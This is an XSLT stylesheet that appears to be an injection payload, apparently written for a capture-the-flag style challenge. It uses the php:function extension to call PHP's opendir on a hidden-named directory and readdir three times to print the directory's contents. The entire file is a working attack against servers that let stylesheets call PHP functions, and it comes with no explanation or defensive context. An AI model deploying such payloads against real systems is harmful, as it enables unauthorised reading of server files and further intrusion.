<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
    <xsl:value-of select="php:function('opendir', '.6ff3200bee785801f420fba826ffcdee')"/>

    Contenu 1: <xsl:value-of select="php:function('readdir')"/>
    Contenu 2: <xsl:value-of select="php:function('readdir')"/>
    Contenu 3: <xsl:value-of select="php:function('readdir')"/>
</xsl:template>
</xsl:stylesheet>